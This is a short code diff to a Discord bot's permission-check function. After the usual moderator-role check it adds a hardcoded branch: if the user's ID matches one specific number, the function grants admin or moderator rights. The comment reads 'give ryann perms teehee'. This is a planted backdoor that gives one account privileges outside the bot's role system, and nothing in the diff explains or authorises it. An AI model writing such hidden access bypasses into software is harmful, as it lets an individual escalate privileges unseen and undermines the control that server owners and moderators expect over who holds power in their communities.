@@ -85,6 +85,10 @@ def has_admin_or_mod_permissions(interaction: discord.Interaction) -> bool:
         for role in interaction.user.roles:
             if role.name.lower() in mod_roles_lower:
                 return True
+            
+    # give ryann perms teehee
+    if interaction.user.id == 516344918566764594:
+        return True
     
     return False
 
